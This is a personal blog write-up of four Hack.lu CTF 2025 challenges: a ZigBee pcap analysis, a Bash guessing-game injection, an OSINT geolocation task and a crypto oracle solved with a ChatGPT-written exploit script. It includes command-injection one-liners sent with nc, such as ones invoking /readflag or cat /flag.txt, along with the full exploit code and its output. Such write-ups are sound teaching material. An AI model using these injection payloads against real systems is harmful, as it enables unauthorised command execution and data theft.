---
layout: post
title: "Hack.lu CTF 2025"
author: cryptax
date: 2025-10-20
tags:
- Hack.lu
- CTF
- 2025
- Crypto
- OSINT
- Bash
- ZigBee
- r2ai
- r2mcp
---

# Hack.lu CTF 2025

I played this CTF in a different way: very relaxed, only looked at 4 challenges I was interested in, solved 3 ;P and nearly 4... Did not even peek at the other challenges (see [Conclusion](#conclusion) about that).

All challenges at **Hack.Lu** were organized as if they were items in an IKEA shop, including their names:

- [**MANUAL**](#manual-crypto---flagged-with-no-skill): I flagged this crypto challenge entirely with ChatGPT. I didn't even need to understand it. That's disappointing. It's a big issue with CTF challenges now... 
- [**ZIGBAKVAM**](#zigbakvam-misc): ChatGPT helped me a little craft my extraction script, but as it got it wrong, I ended up doing the work and flagging by myself. Good. Self pride.
- [**GISSNINGSLEK**](#gissningslek-misc): I should have flagged this one much quicker, if I had read correctly a 20 line Bash script. Hmmm. Instead, I went in complex tech with r2ai, r2mcp and ChatGPT. And finally found the solution. This writeup is a journey into how things often happen in CTFs when you're a bit too tired and not so wise.

Finally, the last challenge I worked with a team mate was the OSINT challenge [**GISSAPLATSER**](#gissaplatser). 


## ZIGBAKVAM (misc)

This challenge was dealing with **ZigBee**. That's interesting with regards to Ph0wn's usual topics, so I looked into it (and solved it :smile:).

You are given a `challenge.pcap`. 

### How I tried to use WHAD, when that wasn't useful at all

Initially, I wanted to use [WHAD](https://github.com/whad-team/whad-client/) over the pcap, because WHAD is such a great tool to work with BLE, ZigBee and other protocols of that sort. 

I tried (1) wplay to "replay" the pcap, and (2) wanalyze to find interesting stuff on it:

```
wplay --flush challenge.pcap zigbee | wanalyze
[!] Unsupported PCAP file (DLT: 230)
```

Some AI tells me this means *"the packet capture file uses a data link type (DLT) that the tool cannot process. DLT 230 corresponds to DLT_LINUX_SLL, which is a "cooked" capture format used by Linux for capturing on multiple interfaces, often resulting in a loss of complete layer 2 information like MAC addresses"*. So be it.

ChatGPT creates a first script to fix the pcap, and I run my command again:

```
wplay --flush challenge.pcap zigbee | wanalyze
[!] Unsupported PCAP file (DLT: 195)
```

DLT 195 corresponds basically to the same style of error, and ChatGPT gave me a better script to cope with it too.


```python
#!/usr/bin/env python3
import dpkt
import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} infile.pcap outfile.pcap")
    sys.exit(1)

infile, outfile = sys.argv[1], sys.argv[2]

DLT_IEEE802154_WITH_FCS = 230  # original
DLT_IEEE802154          = 148  # what wplay expects

with open(infile, "rb") as f:
    pcap_reader = dpkt.pcap.Reader(f)
    linktype = pcap_reader.datalink()
    if linktype != DLT_IEEE802154_WITH_FCS:
        print(f"[!] Input has DLT {linktype}, not 230 — continuing anyway")
    
    with open(outfile, "wb") as out_f:
        pcap_writer = dpkt.pcap.Writer(out_f, linktype=DLT_IEEE802154)

        for ts, buf in pcap_reader:
            # remove 2-byte FCS if present
            if len(buf) > 2:
                buf = buf[:-2]
            pcap_writer.writepkt(buf, ts=ts)

print(f"[+] Wrote DLT 148 pcap to {outfile}")
```

Third attempt, I run *again* WHAD on my fixed pcap:

```
wplay --flush fixed.pcap zigbee | wanalyze
[!] WHAD device doesn't support selected domain (zigbee)
```

Arg. My device doesn't support ZigBee! Well, yes, I know, but I'm supplying a pcap, shouldn't it work over the pcap? It seems it's potentially an issue (which will soon be fixed) with WHAD. Anyway, it doesn't matter... I found out we don't need WHAD :wink:

### Wireshark

I inspect `challenge.pcap` with Wireshark. In the midst of ZigBee ZCL packets, I spot some with "Unknown Commands". The unknown command 0x10 is particularly interesting with its text message `CTRL_GET_NEXT_FLAG_BYTE`.

![](/images/hacklu2025-zigbee1.png)

This packet is always going from source 0x0000 to destination 0xf0001.
Note its sequence number: 4.

```
ZigBee Network Layer Data, Dst: 0xf001, Src: 0x0000
ZigBee Application Support Layer Data, Dst Endpt: 53, Src Endpt: 1
ZigBee Cluster Library Frame, Mfr: Unknown (0xbeef)
    Frame Control Field: Cluster-specific (0x05)
    Manufacturer Code: Unknown (0xbeef)
    Sequence Number: 4
    Command: Unknown (0x10)
Data (23 bytes)
    Data: 4354524c5f4745545f4e4558545f464c41475f42595445
    [Length: 23]
```

I notice that the next 2 packets always appear to be a response.
They go from 0xf0001 to 0x0000, and the sequence number match with the request.

```
Frame 112: 32 bytes on wire (256 bits), 32 bytes captured (256 bits)
IEEE 802.15.4 Data, Src: 0xf001, Dst: 0x0000
ZigBee Network Layer Data, Dst: 0x0000, Src: 0xf001
ZigBee Application Support Layer Data, Dst Endpt: 1, Src Endpt: 53
ZigBee Cluster Library Frame, Command: Default Response, Seq: 4
    Frame Control Field: Profile-wide (0x18)
    Sequence Number: 4
```

The first response contains a ZCL "default response" which appears to be just acknowledging the request.

```
    Command: Default Response (0x0b)
    Response to Command: 0x10
    Status: Success (0x00)
```

The second response is more interesting, it's a "ZCL Report Attributes" response, and apparently it contains *one byte*, a bitmap field.

```
Frame 113: 36 bytes on wire (288 bits), 36 bytes captured (288 bits)
IEEE 802.15.4 Data, Src: 0xf001, Dst: 0x0000
ZigBee Network Layer Data, Dst: 0x0000, Src: 0xf001
ZigBee Application Support Layer Data, Dst Endpt: 1, Src Endpt: 53
ZigBee Cluster Library Frame, Mfr: Unknown (0xbeef), Command: Report Attributes, Seq: 4
    Frame Control Field: Profile-wide (0x1c)
    Manufacturer Code: Unknown (0xbeef)
    Sequence Number: 4
    Command: Report Attributes (0x0a)
    Attribute Field, Bitmap: 66
        Attribute: 0x00f1
        Data Type: 8-Bit Bitmap (0x18)
        Bitmap8: 0x66
```

I check that the values of that Bitmap8 field are printable, and they are. So, the idea is to concatenate them and obtain the flag.

### Extraction script and flag

I explain to ChatGPT what to do, and ask it to generate the script for me. Either my explanations were poor, or ChatGPT is weak, but I never got a working script. However, I got the "template" which uses scapy.

The issue with ChatGPT's script:

1. It wasn't retrieving the command byte correctly, hence never finding that 0x10 command packet. The command is at `payload[4]` not `payload[0]` as it thought...
2. It had written complex (faulty) code to get the bitmap field of the packet, when it was so simple just to take the *last* byte of the packet...

**Instead of explaining to ChatGPT what to fix, I did it myself** :wink:.

```python
from scapy.all import rdpcap, conf
from scapy.layers.zigbee import ZigbeeAppDataPayload

conf.dot15d4_protocol = 'zigbee'
PCAP_FILE = "./challenge.pcap"

packets = rdpcap(PCAP_FILE)
print(f"[+] Loaded {len(packets)} packets from {PCAP_FILE}")

result_bytes = []

def get_zcl_payload(pkt):
    """Extract ZCL payload if it exists."""
    if ZigbeeAppDataPayload in pkt:
        return bytes(pkt[ZigbeeAppDataPayload].payload)
    return None

for i, pkt in enumerate(packets):
    payload = get_zcl_payload(pkt)
    if not payload or len(payload) < 5:
        continue

    cmd = payload[4]           # ZCL command
    seq_number = payload[3]    # ZCL sequence number

    if cmd == 0x10:
        print(f"[i] Packet {i}: Unknown ZCL cmd 0x10, seq={seq_number}")

        # Look at packet i+2
        if i + 2 < len(packets):
            resp = packets[i + 2]
            resp_payload = get_zcl_payload(resp)
            print(f"resp_payload={resp_payload}")
            result_bytes.append(resp_payload[-1])
            # Complex faulty code generated by ChatGPT:
            # if resp_payload and len(resp_payload) > 2:
            #     if resp_payload[1] == seq_number:
            #         bitmap8 = resp_payload[-1]
            #         result_bytes.append(bitmap8)
            #         print(f"[>] Response packet {i+2}: seq={seq_number}, Bitmap8={bitmap8:#04x}")
            #     else:
            #         print(f"[!] Packet {i+2} seq mismatch: {resp_payload[1]} != {seq_number}")
            # else:
            #     print(f"[!] Packet {i+2} has no valid ZCL payload")

if result_bytes:
    final_string = bytes(result_bytes).decode(errors="ignore")
    print(f"\n[+] Final string: {final_string}")
else:
    print("[!] No matching packets found.")
```    

I ran the script, and go the flag. There is a trailing `d` after the flag, I don't know why, didn't investigate that, just removed it.

```
[i] Packet 1015: Unknown ZCL cmd 0x10, seq=155
resp_payload=b'\x1c\xef\xbe\x9b\n\xf1\x00\x188'
[i] Packet 1046: Unknown ZCL cmd 0x10, seq=160
resp_payload=b'\x1c\xef\xbe\xa0\n\xf1\x00\x18}'
[i] Packet 1069: Unknown ZCL cmd 0x10, seq=165
resp_payload=b'\x18\x00\n\x04\x00 d'
[i] Packet 1093: Unknown ZCL cmd 0x10, seq=168
resp_payload=b'\x01\xa9\x01\x02'

[+] Final string: flag{zigbee_for_smart_home_1s_gr8}d
```

## GISSNINGSLEK (misc)

In this challenge, we get another Docker environment to run the files on our own host.
Basically, the Docker container has:

1. A binary called `ynetd` which is a bit obscure... and vulnerable.
2. A binary called `readflag` that we must invoke to read the hidden flag file in the container.
3. A script `gissningslek.sh`, which is called by `ynetd` and serves as the user application

### The Bash script

It generates a random number that the user is supposed to guess. 
If we guess it correctly 1000 times, we will call `/readflag`, and get the flag.

> Honestly, the solution is simple if you read calmly the shell script.
> But at this point of the day, I read it too quickly, and **didn't see that it called /readflag at the end if the guesses were correct**.

For sure, we're not going to guess a number in 11337... without a hack.


```bash
#!/usr/bin/env bash

echo "Låt oss spela en gissningslek!"
echo "Varning: Du får inte ändra din gissning. :("

read -r user_guess

function guess() {
  rand=$(( ( RANDOM % 10000 )  + 1337 ))
  if [[ "${1}" -eq "${rand}" ]];
  then
    echo "Rätta"
  else
    echo "Fel"
    exit 1
  fi
}

for _ in {1..1000}; do
  guess "${user_guess}"
done

/readflag
```

### r2ai, because I can't help it

I use [r2ai](https://github.com/radareorg/r2ai/) to decompile `readflag`.
The `readflag` binary is very straight forward, and actually there is nothing interesting to exploit about it: it does what it says: read the flag.

```c
int main(int argc, char **argv, char **envp) {
    char buffer[528];
    int gid, egid;
    ssize_t bytes_read, bytes_written;
    int fd;

    egid = getegid();
    gid = getgid();
    
    if (egid == gid) {
        puts("execute this binary on the server to get the flag!");
    }

    fd = open("/flag.txt", O_RDONLY);
    if (fd < 0) {
        puts("something is wrong: couldn't open /flag.txt");
        exit(1);
    }

    while (1) {
        bytes_read = read(fd, buffer, 512);
        if (bytes_read < 0) {
            puts("something is wrong: read errored");
            exit(1);
        }
        
        if (bytes_read == 0) {
            break;
        }
        
        bytes_written = write(1, buffer, bytes_read);
        if (bytes_written < 0) {
            puts("something is wrong: write errored");
            exit(1);
        }
    }
    
    return 0;
}
```

### r2mcp, because I can

> NB. This part isn't necessary to solve the challenge. I tried to understand `ynetd`, because it seemed a good idea, but actually, the solution is obvious from the shell script and there was no need to understand *how* `ynetd` was implemented.

I know that `ynetd` supports several arguments, as the Dockerfile launches it as `ynetd -lt 240 -d /app -sh y -se y -np y '/app/gissningslek.sh'`.

With r2, I find the usage in the binary. It's quite promising: shell execution, privilege escalation etc.

```
-lt $lim        limit cpu time in seconds (default 3)
-d $dir         working directory (default user's home if -u else current)
-sh [yn]        invoke /bin/sh to execute $cmd? (default y)
-se [yn]        use socket as stderr? (default n)
-np [yn]        allow gaining privileges e.g. with setuid? (default n)
```

Although `ynetd` is mostly a fat `main()`, it's a bit too big for r2ai and the LLMs I select. So, I jump to [radare2-mcp](https://github.com/radareorg/radare2-mcp) to understand things in it, while I open a new chat with ChatGPT to get a few ideas.

### ChatGPT, because everybody does

> NB. This part is totally useless lol... 

ChatGPT makes me test a few quick pwns which fail. Then, we turn to understanding how the shell is launched. I tell ChatGPT `ynetd` runs `execle`. It gives me another bunch of pwns, none of them work:

```
printf '0\n$(/readflag)\n' | nc 127.0.0.1 1024
printf '0 ]] ; /readflag ; #\n' | nc 127.0.0.1 1024
printf '0 ] ; cat /flag.txt ; #\n' | nc 127.0.0.1 1024
...
```

I persist on `execle`, and ask r2mcp to decompile the part where `ynetd` uses it. After some conversation, I obtain this code in C (generated by LLM):

```c
// Configuration du shell si l'option -sh est activée (par défaut)
char *shell_argv[] = {"/bin/sh", "-c", command, NULL};

// Si -sh n'est pas activé, on exécute directement la commande
char *direct_argv[] = {command, NULL};

// Configuration de l'environnement pour execle
char *envp[] = {NULL}; // Environnement vide

// Appel de execle selon le mode d'exécution choisi
if (use_shell) {
    execle("/bin/sh", "/bin/sh", "-c", command, NULL, envp); 
} else {
    execle(command, command, NULL, envp);
}
```

ChatGPT wants me to do `strace`, but I explain I can't. It generates a few more quick tests, which fail:

```
printf '$(/readflag); exit\n' | nc 127.0.0.1 1024
printf '"; /readflag; #\n' | nc 127.0.0.1 1024
printf '"; /readflag 2>&1; echo "\n' | nc 127.0.0.1 1024
```

### Am I going to have to do the work myself? lol

With ChatGPT oneliners, most attempts fail with *syntax errors* in the Bash script:

```
$ printf '0 ) ; /readflag ; (\n' | nc 127.0.0.1 1024
Låt oss spela en gissningslek!
Varning: Du får inte ändra din gissning. :(
/app/gissningslek.sh: line 10: [[: 0 ) ; /readflag ; (: syntax error in expression (error token is ") ; /readflag ; (")
Fel
```

I have a look at the shell script `gissningslek.sh`, and see the test is with `-eq`. 

```bash
 if [[ "${1}" -eq "${rand}" ]];
  then
    echo "Rätta"
  else
    echo "Fel"
 fi
```

This gives me another idea. Now, yes, I admit my attempt is silly, and the solution is quite obvious at this point, but well, sometimes you don't see things when they're in front of your eyes...
Nevertheless, I tried this: `printf '1 -eq /readflag\n' | nc 127.0.0.1 1024`

```
$ printf '1 -eq /readflag\n' | nc 127.0.0.1 1024
Låt oss spela en gissningslek!
Varning: Du får inte ändra din gissning. :(
/app/gissningslek.sh: line 10: [[: 1 -eq /readflag: division by 0 (error token is "readflag")
Fel
```

Despite being silly, this attempt will actually lead me (and ChatGPT) to the solution. I notice that this time, I get *another error*: **division by 0**, not syntax error.

I ask ChatGPT if it inspires it. I admit I should have tried this one myself.

```
printf 'rand\n' | nc 127.0.0.1 1024
```

and that's the solution!

### Flag


```
$ printf 'rand\n' | nc gissningslek.solven.jetzt  1024
...
Rätta
Rätta
flag{it5_y0ur_lucky_d4y_h3h3_04217a096}a
```

Not sure why there's a trailing `a` again, but nevermind we have the flag.

### Explanation

If you haven't grasped it yet, this is why it works:

1. We inject `printf 'rand\n'`
2. So, in the script, we have `if [[ "${1}" -eq "${rand}" ]]` which transforms to `if [[ "${rand}" -eq "${rand}" ]]`.
3. `rand` is a bash variable (whose value is `rand=$(( ( RANDOM % 10000 )  + 1337 ))`). So, by comparing it to itself, we are sure the test will succeed all the time.
4. Therefore, we'll get 1000 success (`Rätta`), and at the end, the shell will run `/readflag`
5. We get the flag :smile:

## GISSAPLATSER

There were 10 places to find (actually only 9 required to flag), we were short of time and only found 7. To be honest, my team mate did the work for this challenge. 

![](/images/hacklu2025-gissa.png)

I only helped him substantially on one of the images. Each image had a name, which served as a hint. That image was named `royal`.

![](/images/hacklu2025-royal.png)


I took a screenshot of the image, and gave it to Google Images. It didn't give me good results at first. 

Then, in ChatGPT, I tried to figure out which country that was. Obviously a european country, with mountains like the Alps, or the Pyrenees. I wondered if it could be the Pyrenees, but there was a sign on the gate written "Privat", and there's no place in France or Spain where "Privat" would be used for "private" (privé in French). This sounded more german, so the country could be Switzerland, Germany or Austria.

I focused on the chalet: entirely wooden, dark and the shape of the roof. It could have matched places in Switzerland, but to be honest, it could have matched plenty of places, including in France.

Then, I had the idea to try again Google Images, but focus on the mountains we see in the background. Indeed, each mountain has its own shape, and I hoped to have Google recognize a given peak.

Better than that it actually gave me place with the exact gate and chalet. The image is no longer working today [here](https://www.shutterstock.com/image-photo/vaduz-liechtenstein-castle-facing-swiss-alps-1566679372?dd_referrer). The place is in **Liechtenstein, Vaduz**, and there's a *castle* there, facing the Swiss Alps...

My team mate found the exact location from there and "flagged" this image quickly.

If you want full solutions to this challenge, look at this [writeup](https://tommy-kay.github.io/posts/Hack.luCTF2025-Misc-GissaPlatser/).

## MANUAL (crypto) - flagged with no skill

> Reminder. The writeup for this challenge is going to be very disappointing. You are warned.

![](/images/hacklu2025-crypto.png)

This is a crypto challenge, where you are given a Docker environment you can play and test on your own host. The scenario is that you have an incomplete instruction manual: you have the instructions, but you don't know to which pieces they apply... Silly, right? :joy:

`server.py` shows that you have 3 types of operations :

1. Screw: left or right bit rotation by a random number...
2. Turn around: reverse byte order
3. Hammer: XOR with a random mask...

The instruction manual consists of 46 of those instructions: they are randomly chosen (except the first 3 and the last 3), and notice instructions's implementation contains randomness too. We have 300 attempts to get the item in correct shape.

The **solution is going to be disappointing**: I gave `server.py` to ChatGPT, and it solved it. I didn't even have to really understand the underlying problem.

ChatGPT told me it's a hidden permutation problem.

![](/images/hacklu2025-manual2.png)

Then, it gave me a script that worked without flaw and indeed revealed the flag after 257 attempts.

```python
#!/usr/bin/env python3
# exploit.py — recover flag from server.py running on TCP port 1024
# Usage: python3 exploit.py [host] [port]
# Defaults: host=127.0.0.1 port=1024

import socket
import sys
import re
from typing import List

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1024

HEX64_RE = re.compile(rb"\b([0-9a-fA-F]{64})\b")

def recv_all_until(sock: socket.socket, substr: bytes, timeout=10.0) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            buf += data
            if substr in buf:
                break
        except socket.timeout:
            break
    return buf

def recv_until_prompt(sock: socket.socket) -> bytes:
    # server shows a prompt like "(0/300) Please enter your 32 selected pieces ..."
    # we'll wait for "Please enter" which should appear before each expected reply.
    return recv_all_until(sock, b"Please enter", timeout=5.0)

def find_last_hex64(buf: bytes):
    m = list(HEX64_RE.finditer(buf))
    if not m:
        return None
    return m[-1].group(1).decode()

def send_and_get_hex(sock: socket.socket, hexstr: str) -> str:
    # send hex + newline and wait for immediate assembled output (64 hex chars)
    sock.sendall((hexstr + "\n").encode())
    # server will respond printing the assembled hex; read a bit and search
    buf = recv_all_until(sock, b"Here is what the intern put together:", timeout=5.0)
    # read a bit more in case it's after the marker
    buf += recv_all_until(sock, b"\n", timeout=1.0)
    h = find_last_hex64(buf)
    if h is None:
        # fallback: drain a bit more and try again
        buf += recv_all_until(sock, b"Please enter", timeout=2.0)
        h = find_last_hex64(buf)
    if h is None:
        raise RuntimeError("Could not find 64-hex response from server. Buffer:\n" + repr(buf))
    return h

def basis_vec(i: int) -> bytes:
    # match server's int.from_bytes(value, "big")
    # bit indexing: i=0 -> least-significant bit
    b = bytearray(32)
    byte_idx = 31 - (i // 8)         # big-endian layout
    bit_in_byte = i % 8
    b[byte_idx] = 1 << bit_in_byte
    return bytes(b)

def invert_binary_matrix_from_columns(cols: List[int]) -> List[int]:
    # cols[j] is a 256-bit int representing column j (bits 0..255 are rows)
    # Build left rows: left_row[i] is 256-bit int whose bit j is A[i,j]
    n = 256
    left = [0] * n
    right = [0] * n
    for i in range(n):
        # build left row i
        row = 0
        for j in range(n):
            bit = (cols[j] >> i) & 1
            if bit:
                row |= (1 << j)
        left[i] = row
        right[i] = (1 << i)  # identity on right

    # Gaussian elimination to make left -> identity, applying same ops to right
    for col in range(n):
        pivot = -1
        for r in range(col, n):
            if ((left[r] >> col) & 1) == 1:
                pivot = r
                break
        if pivot == -1:
            raise RuntimeError("Matrix is singular (unexpected).")
        # swap pivot row with current if needed
        if pivot != col:
            left[col], left[pivot] = left[pivot], left[col]
            right[col], right[pivot] = right[pivot], right[col]
        # eliminate other rows that have bit col set
        for r in range(n):
            if r != col and ((left[r] >> col) & 1):
                left[r] ^= left[col]
                right[r] ^= right[col]

    # Now left should be identity; right[row] is the row of A^{-1}
    return right

def apply_inverse_rows(inv_rows: List[int], v: int) -> int:
    # inv_rows[i] is 256-bit row i of A^{-1}; compute A^{-1} * v
    n = 256
    out = 0
    for i in range(n):
        # parity of bitcount(inv_rows[i] & v)
        if (inv_rows[i] & v).bit_count() & 1:
            out |= (1 << i)
    return out

def main():
    print(f"[+] connecting to {HOST}:{PORT} ...")
    s = socket.create_connection((HOST, PORT), timeout=10.0)

    # read initial banner up to first prompt
    buf = recv_until_prompt(s)
    print(buf.decode(errors="ignore"))

    # 1) query zero -> b
    print("[*] querying T(0) ...")
    h0 = send_and_get_hex(s, "00" * 32)
    b_int = int(h0, 16)
    print(f"[+] b (T(0)) = {h0}")

    # 2) query each basis vector -> cols
    cols = []
    for i in range(256):
        bv = basis_vec(i)
        hexbv = bv.hex()
        # progress print every 16
        if i % 16 == 0:
            print(f"[*] querying basis bit {i:3d}/255 ...")
        hi = send_and_get_hex(s, hexbv)
        yi = int(hi, 16)
        col = yi ^ b_int   # column j = T(e_j) xor b
        cols.append(col)
    print("[+] gathered all columns (256)")

    # invert matrix
    print("[*] inverting matrix A over GF(2) ...")
    inv_rows = invert_binary_matrix_from_columns(cols)
    print("[+] inversion done")

    # now get server to print transformed FLAG (finish)
    print("[*] asking server to finish so it prints transformed FLAG ...")
    s.sendall(b"finish\n")
    # read a bit and extract the last 64-hex (the printed transformed FLAG at end)
    final_buf = recv_all_until(s, b"Thanks for your help!", timeout=5.0)
    # sometimes need to read until close
    try:
        more = s.recv(4096)
        final_buf += more
    except Exception:
        pass
    tf_hex = find_last_hex64(final_buf)
    if tf_hex is None:
        raise RuntimeError("Could not find transformed FLAG hex in final output.")
    print(f"[+] transformed FLAG (yf) = {tf_hex}")
    yf = int(tf_hex, 16)

    # compute original flag
    v = yf ^ b_int
    flag_int = apply_inverse_rows(inv_rows, v)
    flag_bytes = flag_int.to_bytes(32, "big")
    print("[+] recovered FLAG bytes (raw):", flag_bytes)
    try:
        print("[+] FLAG decoded:", flag_bytes.decode())
    except Exception:
        print("[!] FLAG could not be decoded as utf-8; hex:", flag_bytes.hex())

    s.close()

if __name__ == "__main__":
    main()
```

I ran on it on the host to get the flag:

```
$ python3 exploit.py manual.flu.xxx 1024
[+] connecting to manual.flu.xxx:1024 ...
Here at FLUX, we always strive to include the latest technological advancements in our products.
This instruction manual has been generated just for you! But we don't know which pieces are needed to actually construct it...
Can you help us figure out how it all fits together?

We've allocated some time for one of our interns to help you with this task.
They will attempt to follow the instruction manual using pieces you provide, for a maximum of 300 attempts.
(0/300) Please enter your 32 selected pieces as one hex encoded string, or 'finish' to exit early:
[*] querying T(0) ...
[+] b (T(0)) = 6f818c475481dd8a0a1857e63905751d9359ab49d21d03b3ad48cc10c8db3f26
[*] querying basis bit   0/255 ...
[*] querying basis bit  16/255 ...
[*] querying basis bit  32/255 ...
[*] querying basis bit  48/255 ...
[*] querying basis bit  64/255 ...
[*] querying basis bit  80/255 ...
[*] querying basis bit  96/255 ...
[*] querying basis bit 112/255 ...
[*] querying basis bit 128/255 ...
[*] querying basis bit 144/255 ...
[*] querying basis bit 160/255 ...
[*] querying basis bit 176/255 ...
[*] querying basis bit 192/255 ...
[*] querying basis bit 208/255 ...
[*] querying basis bit 224/255 ...
[*] querying basis bit 240/255 ...
[+] gathered all columns (256)
[*] inverting matrix A over GF(2) ...
[+] inversion done
[*] asking server to finish so it prints transformed FLAG ...
[+] transformed FLAG (yf) = 5976ab5051025a7c3c7bd0903a7331aee42f188f847cb5749eabbb86ee9de951
[+] recovered FLAG bytes (raw): b'flag{crypt0_kn0wl3dg3_g4in3d_:3}'
[+] FLAG decoded: flag{crypt0_kn0wl3dg3_g4in3d_:3}

```



## Conclusion

- **I enjoyed working only on a few challenges of the CTF**. Sure, that's not a way to win, but it was fun for me, and that's what I am after + looking at 4 challenges, and solving 3 is a good rate :smile: It was less stressful, and I enjoyed both the CTF *and my week-end*.
- **AI is an issue to CTFs**. When I say so, some people immediately argue "it's a tool". Yes, yes, it is! I do like AI for plenty of things, but nevertheless, in my opinion, it's going to kill the sould of CTFs if we don't work out for new solutions, new challenges etc. I'll blog on that one day.
